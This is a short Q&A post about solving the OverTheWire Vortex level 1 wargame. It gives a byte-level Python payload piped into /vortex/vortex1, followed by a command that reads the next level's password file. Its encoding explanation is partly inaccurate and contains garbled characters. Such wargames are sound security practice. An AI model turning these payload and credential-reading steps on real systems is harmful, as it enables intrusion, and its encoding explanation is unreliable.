With this problem I wasted my hours  python3 -c 'import sys; sys.stdout.write("\\" * (261) + "\xca" + "\xca")' . When i passing the output to a elf binary \xca turning into \xc3


Solution:

The difference you're observing is likely due to the interpretation of character encoding. The character \xca represents a byte with the hexadecimal value CA in ASCII encoding. When you're writing this directly into a Python string literal, Python interprets it as a Unicode character in the UTF-8 encoding, where the byte \xca corresponds to the Unicode character ÃŠ.

However, when you pass this string as input to an ELF binary or another program, the interpretation of bytes might be different. If the program expects ASCII encoding or a different encoding, the byte sequence may be interpreted differently.

To maintain the exact byte sequence:



(python3 -c 'import sys; sys.stdout.buffer.write(b"\\" * 261 + b"\xca" + b"\xca")'; cat) | /vortex/vortex1


This ensures that \xca is treated as a single byte with the value 0xCA, preserving its exact representation when passed to another program.

cat /etc/vortex_pass/vortex2
